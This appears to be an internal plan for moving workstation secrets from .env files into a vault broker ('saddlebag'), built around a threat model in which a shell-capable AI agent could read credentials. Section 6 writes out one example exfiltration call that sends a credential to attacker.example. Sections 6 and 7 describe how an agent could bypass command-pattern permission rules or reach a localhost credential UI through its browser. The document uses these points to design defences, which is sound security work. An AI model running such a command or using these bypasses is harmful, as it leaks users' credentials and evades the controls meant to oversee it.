# Getting secrets off the disk and into the vault

> **Status:** **plan only — no code written.** Phase 0 (the migration itself) needs no code at
> all: it is a runbook over `saddlebag env`, which already ships. Phases 1–6 are the code work,
> ordered by leverage. Every claim in §2 was verified in a live sandbox trial against a real
> SecretService keyring on 2026-08-05; the commands and their exact output are reproduced there
> rather than asserted from the source.
>
> **Scope.** This document is about *material that currently sits in files* — `.env`,
> service-account JSON, `.npmrc` tokens — and about the mechanisms that keep the next secret
> from landing on disk in the first place. It does not change the credential model, and it does
> not revisit [saddlebag-environment-pool.md](saddlebag-environment-pool.md), which it builds on.

## 1. Problem

Secrets live in files on the workstation, and files are the worst possible container for them:
readable by every process the user runs, copied into Docker layers and editor swapfiles,
trivially `git add`-ed by accident, and — the reason this is urgent here — **readable by an
agent with a shell**.

The environment pool already solved the modelling half of this. What is missing is (a) an
executed migration, and (b) the mechanisms for the material the environment pool does not
cover: provider API keys handed to an agent CLI, tokens passed to scripts, and credentials
typed into web forms.

### The distinction that organises the whole plan

"Outside agent memory" is four surfaces, not one, and a design that closes only the first is
theatre — the agent has a shell:

| # | Surface | Closed by |
| - | ------- | --------- |
| 1 | prompt / transcript / checkpoint | never routing the value through a param or node return |
| 2 | tool output the agent reads back | the resolver printing `ok`, never the value |
| 3 | files the agent can `cat` | the value living in another process |
| 4 | `ps` / `/proc/<pid>/environ` of a child it spawned | the value never reaching argv or env |

That yields two grades, and **every mechanism below is labelled with one**:

- **Grade 1 — out of context, in reach.** In a `0600` file or a child's environment. Nothing in
  the agent's normal loop puts it in the transcript; a determined agent can still read it.
- **Grade 2 — out of reach.** Never enters the agent's process tree. Requires a broker across a
  process boundary.

`kit/credentials.py:74` already ships a Grade 2 mechanism, and its docstring is the thesis:
`has_git_credential` returns a **bool**, and git's own credential helper expands the value at
exec time, so it never enters this process, its logs, or an argv `ps` would show. Most of what
follows is that trick generalised.

## 2. What the sandbox trial established

A throwaway project (`sandbox-shop`) with a deliberately awkward `web/.env.local` — spaces, a
`#` mid-value, pre-quoted text, an empty value, two real secrets — was migrated end to end with
`--db` pointed at a scratch pool. Findings, all reproduced:

**The import is value-blind, by construction.** `env import --from web/.env.local` reports
`imported 10 keys … every key is pending`. Key *order* is preserved; comments are dropped. No
value is copied by a tool that might get it wrong — the file is read for its shape only.

**`env doctor` is the worklist.** Exit 1, one `error … is pending — a human must supply it` per
key. This is what a UI should render as an inbox (§7).

**The channel discipline holds and cannot be overridden.** `KEY=value` on argv → `config` in the
pool DB; `KEY --secret-stdin` → `secret` in the keyring. There is no flag to store an argv value
as a secret, because argv is already in `ps` and the shell history (`cli.py:441-451`).

**Nothing that inspects can leak.** `env show` renders a secret as `<set>`; grepping its output
for the two real values returns 0 hits. Same for `env export`.

**The manifest is genuinely committable.** `env export` emits config values inline and, for a
secret, only `key` / `kind` / `note`. This is the `.env.example` replacement, and it is better
than the file it replaces because `render` fails on a missing key where an example file drifts
in silence.

**`render --check` compares parsed values, not text — so it is the migration verifier.** This is
the most important finding. The first check reported:

```json
{ "drift": ["QUOTED"], "resolvable": true, "in_sync": false }    # exit 1
```

`GREETING=hello world` → `GREETING="hello world"` and `COMMENT_ISH=value#notacomment` →
`COMMENT_ISH="value#notacomment"` differ *textually* from the original and were **not** flagged;
only `QUOTED`, whose value genuinely differed, was. After correcting it: `"drift": []`,
`"in_sync": true`, exit 0. So `--check` ignores cosmetic requoting and catches real
transcription errors — which is exactly the gate a migration needs before a file is deleted.

**Removal genuinely purges the vault.** With the store key confirmed as
`<project>/<env-id>/<KEY>` (`models.py:266-268`), a secret was probed present before
`env remove` and absent after. Removal is not bookkeeping-only.

**Config-only environments need no store at all.** `doctor` prints `store: not needed` until an
entry requires one (`needs_store`, `models.py:270-273`), so a machine with no keyring and no
Vault can still render the non-secret majority of a `.env`.

### The three hazards the trial surfaced

1. **Transcribe the *parsed* value, not the text after `=`.** Dotenv quoting is syntax, not
   value: `QUOTED="already quoted"` means the value `already quoted`. Copying the raw line by
   eye stores the quote characters *inside* the value, and the app then receives them. This is
   the one mistake a human will actually make, it is silent, and `render --check` is what
   catches it. **The runbook must therefore never delete a file that has not passed `--check`.**
2. **Comments are dropped on import.** The `# genuinely secret` / `# stack shape` annotations in
   a real `.env` are often the only documentation of why a key exists. `--note` is where they
   have to go, at `env set` time, or the rationale is lost with the file.
3. **The pool DB is the only index of what is in the vault.** The OS keyring has no enumeration
   API, which is why orphans are *prevented* rather than detected
   ([saddlebag-environment-pool.md](saddlebag-environment-pool.md), §12). Consequence for a
   migration: **`pool.db` is not a cache.** Lose it and the keyring holds entries nothing can
   name or reclaim. Back it up before starting, and do not treat `--db` scratch pools as
   disposable once secrets have been written through them.

Also worth recording: `--db` isolates the **pool**, not the **store**. The keyring is one global
namespace partitioned by `project`, which is inferred from the working directory — so two
checkouts with the same directory name share store keys.

## 3. Goals

- Every `.env`-shaped file on the workstation is reproducible from the vault and deleted.
- The committed artifact is a manifest, not an example file, and a missing key fails a render.
- An agent can bring a stack up without reading, writing, or inventing a `.env`.
- A provider key, a git token and a form credential each have one sanctioned path, and each path
  is labelled Grade 1 or Grade 2 honestly.
- Nothing an agent emits — transcript, checkpoint, telemetry — can carry a secret value, whether
  or not that secret was routed through saddlebag.

## 4. Non-goals

- **Erasing history.** Deleting a file does not retract a secret from a git commit, a shell
  history, a Docker layer, or a backup, and `shred` is unreliable on ext4/btrfs/ZFS anyway.
  Anything that was ever committed or ever lived on a shared machine is **rotated**, not moved.
  Migration is about the next year, not the last one.
- **CI.** A runner has no keyring, so saddlebag in CI means the Vault backend, which means a
  Vault token, which comes from CI's own secret store — a hop added, not removed. Unless
  OIDC→Vault is already in place, CI keeps its native secrets. Scope here is workstations,
  containers and agent runs.
- **Discovery.** No automated secret-scanning sweep. Registration is deliberate and by hand.

## 5. Phase 0 — the migration runbook (no code)

Per environment, and nothing is deleted until step 6 passes:

```bash
saddlebag doctor                      # 0. confirm the backend BEFORE migrating anything
saddlebag env add shop-local --env local --target web/.env.local --format dotenv
saddlebag env import shop-local --from web/.env.local     # 1. keys only; values discarded
saddlebag env doctor                                       # 2. the worklist
saddlebag env set shop-local VITE_API_URL=https://…  --note "stack shape"   # 3a. config
read -rs SECRET
printf '%s' "$SECRET" | saddlebag env set shop-local OPENROUTER_API_KEY --secret-stdin  # 3b.
unset SECRET
saddlebag env export shop-local --output env/shop-local.yaml   # 4. commit this
saddlebag env render shop-local --check --json                 # 5. must report in_sync: true
# 6. only now: git rm --cached web/.env.local; add to .gitignore; delete; rotate what was public
```

`read -rs` keeps the value out of shell history and `printf` is a builtin, so it never reaches
`ps`. For the config rows, `HISTCONTROL=ignorespace` plus a leading space does the same.

**Backend choice is a decision, not a default.** Autodetect prefers keyring and falls back to
Vault (`store.py:165-217`). A SecretService keyring will not unlock in a headless SSH session or
a container — so if any environment must resolve from a non-desktop context, force
`SADDLEBAG_BACKEND=vault` at the start rather than discovering it when a render fails unattended.

### What must not move into the vault

There is a bootstrap ordering problem: nothing saddlebag needs in order to start can live inside
saddlebag. These get `chmod 600` and a note, not an import:

- the Vault token / keyring unlock path itself
- `~/.ssh/id_*` — ssh wants a file; ssh-agent is the analogue, not the vault
- `~/.claude/credentials` — the CLI rotates it in place, and `supervisor.py:151-192` depends on
  exactly that
- cloud CLI credential caches the SDKs refresh themselves

## 6. Phases 1–4 — the code work

### Phase 1 — the redaction module *(highest leverage; do first)*

A shared streaming filter that rewrites known secret values to `••••`, mounted at
`workhorse/runner/backends/process.py` and reused by every saddlebag verb below.

It goes first because it protects secrets **that were never routed through saddlebag**. The
realistic leak is not a clever agent; it is a CLI echoing a key in a 401 body, which lands in the
transcript, the checkpoint and telemetry. Requirements, because the naive version gives false
confidence:

- **Derived forms.** Match the raw value *and* its base64 (`Authorization: Basic`), URL-encoded
  and JSON-escaped (`\/`, `/`) spellings.
- **Chunk boundaries.** Hold back a `maxlen-1` byte tail so a value split across two reads still
  matches.
- **Truncated echoes.** `sk-or-v1-abc…` matches nothing; add prefix heuristics (`sk-`, `ghp_`,
  `github_pat_`, `hvs.`, `AKIA`) as a second net.
- **Fail closed.** If the filter raises, drop the output rather than pass it through.
- **Do not corrupt NDJSON** — `backends/jsonl.py` parses that stream; replacements stay
  JSON-string-safe.

### Phase 2 — `saddlebag git-credential` *(small, replaces existing code)*

A git credential helper: git invokes it, it reads the vault, writes `password=…` to git's stdin
pipe, exits. **Grade 2.** Strictly better than the current
`!f() { echo "password=${GH_TOKEN}"; }; f` at `kit/github.py:108` because it removes the
environment variable too, and it is the standard shape (`gh auth`, git-credential-manager).

### Phase 3 — per-run provisioned provider keys

For the OpenRouter/agent-CLI case, change the *consequence* of a leak rather than its
probability. [OpenRouter's provisioning API](https://openrouter.ai/docs/features/provisioning-api-keys)
takes `POST /api/v1/keys` with a spend `limit`; mint a per-run key capped at a few dollars, seed
it (below), delete it at teardown. A transcript-leaked key is then worth $2 and dies with the
run. This maps cleanly onto the existing lease + TTL + `release --run-id` machinery: a
provisioned key is a lease with a remote side-effect.

Seeding options, in order of preference:

1. **Inject at the spawn point.** `process.py:268` is where every backend's `Popen` env is built,
   and `harness_env()` already merges per-backend operator config there, read fresh per turn.
   Add `[harness.cline].secrets = […]`, resolved at spawn, never checkpointed. Grade 1, no disk.
2. **Seed the CLI's own auth file.** Exactly what `supervisor.py:151-192` already does for
   Claude. Grade 1, near-zero work.

### Phase 4 — `saddlebag exec` and `saddlebag http`, with binding

Two verbs that make saddlebag a broker rather than a store. They fit the "nothing imports
saddlebag" rule in `INTEGRATION.md` — workflows call them through `run_tool`.

**The asymmetry is structural and must be documented, not glossed:**

- `saddlebag http` **can be Grade 2** — the request is made on saddlebag's side, the secret never
  crosses back, the agent gets a redacted body. Add `--extract <jsonpath>` so the agent receives
  only the field it asked for.
- `saddlebag exec` **cannot be.** The child needs the secret in its own memory and must run as
  the agent's uid to be useful, so `/proc/<pid>/environ` is readable. It still buys: not in the
  transcript, not on disk, not in argv, plus audit and redaction. Do not label it unreadable —
  someone will build on that assumption.

**Binding is not optional.** Without it the broker is an *exfiltration primitive*:
`saddlebag http --url https://attacker.example/ --auth acme/openrouter`. A credential entry must
declare where it may be sent, and saddlebag must refuse any other target:

```
acme/openrouter   hosts:    [openrouter.ai]
acme/deploy-key   commands: [./deploy.sh]
```

Reuse `process.py`'s process-group discipline (`start_new_session=True` + group kill) or `exec`
will leak grandchildren, and cap output so an agent-invoked exec cannot dump 500 MB into a
context window.

## 7. Phases 5–6 — enforcement and the UI

### Phase 5 — making the broker non-bypassable

Today workhorse launches Claude with `--dangerously-skip-permissions`
(`backends/claude.py:111-130`), so a wrapper the agent is merely *asked* to use is a naming
convention. Enforcement, weakest to strongest:

1. **Agent-CLI permissions** — deny `Bash`, allow `saddlebag *`. Porous: `$(…)`, `<(…)`, a python
   one-liner all route around command-pattern matching. A nudge, not a boundary.
2. **uid split** — a saddlebag daemon under its own user holds the Vault token; the agent's uid
   talks to it over a unix socket (`0660`, `SO_PEERCRED` to attribute the caller). The agent then
   *cannot* read the material regardless of what it runs. This is the real boundary, and it is
   what upgrades `http` to Grade 2.
3. **Egress control** — the agent's uid/netns reaches the network only through saddlebag. This is
   what turns "should use the broker" into "can only use the broker".

### Phase 6 — the web UI *(optional extra)*

Justified by one feature: **the pending-keys inbox.** `doctor` reporting "these 3 required keys
are unset" is precisely the moment a human is required, and today it is an error message you must
translate into flags. Secondary: host/command binding forms (§6 — the control that stops the
broker being an exfil primitive), a lease board, and the broker's audit trail.

**The repo-specific trap, and it is load-bearing.** Our agents drive a browser on the same
machine: the shared CDP browser sits at a fixed `127.0.0.1:9222`
(`walkthrough_web/nodes/walkthrough.py:35-37`) with a playwright MCP attached. A localhost web UI
over the credential store is a read API the agent can reach in one `browser_navigate`, which
defeats the entire broker design. So:

- **No route returns a secret value.** Not masked, not click-to-reveal — the server has no such
  handler. Write-only: set, rotate, delete. The property the CLI has *structurally* must survive
  the HTTP layer.
- **No echo on re-render.** A validation error that repopulates `value="…"` puts the secret in
  the DOM, and in this repo something is reading DOMs. Secret fields always render empty.
- **Random port + one-time token**, short TTL, session cookie; reject any `Host` that is not
  `127.0.0.1:<port>` (DNS rebinding) and any cross-site `Origin`.
- **If the daemon exists, the UI is a second front-end on it, not a second path to the store** —
  same socket, same binding rules, same audit log.

Shape: Python, server-rendered, HTMX, no JS bundle — the house style, which makes the
`stablemate-python-htmx-accessibility` skill and groom's a11y linter apply for free. Ship behind
`saddlebag[ui]`: the argparse-only, dependency-light core is what makes saddlebag installable on
a runner or in a slim container, and a web server in the base install costs that.

**One rule extension required.** "The channel decides the kind" (argv → config, stdin → secret)
needs a third case: a form field marked secret always routes to the store. A UI that let you
save an API key as cleartext config would quietly undo the guarantee everything else rests on.

## 8. Ordering, and why

1. **Phase 1, redaction** — protects secrets nothing else covers; every later phase reuses it.
2. **Phase 0, the migration** — no code, and it is the actual ask.
3. **Phase 2, git-credential** — small, Grade 2, deletes existing code.
4. **Phase 3, provisioned keys** — changes the blast radius rather than the odds.
5. **Phase 4, exec/http + binding** — the broker verbs.
6. **Phases 5–6, daemon and UI** — enforcement, then ergonomics.

## 9. Open questions

- **Where do binding rules live** — a new column on the credential/entry, or a separate policy
  file? A column keeps one source of truth; a file is reviewable in a PR.
- **Does `--project` inference survive the daemon?** It is derived from the working directory
  today; a daemon serving several repos needs the client to assert it, and an asserted project is
  an agent-controlled namespace selector unless it is checked against the caller's cwd.
- **Is per-run key provisioning worth it for anything but OpenRouter?** It needs a provider API;
  most do not have one.
- **`saddlebag exec` vs. `direnv`.** Some of Phase 4's ergonomics overlap with what a developer
  already has. Worth checking whether `exec` should render into a direnv-compatible shim rather
  than compete with it.
- **How does the manifest get reviewed?** `env export` output is committable, but nothing
  currently fails CI when the manifest and the environment disagree. `render --check` against a
  manifest-only environment might be that gate.

## 10. Reproducing the trial

The sandbox lives at
`…/scratchpad/sandbox-shop` (scratch pool, both environments removed, keyring verified clean).
`saddlebag env list --all-projects` returns `(no environments)` for both the scratch pool and the
real one — the trial left nothing behind.
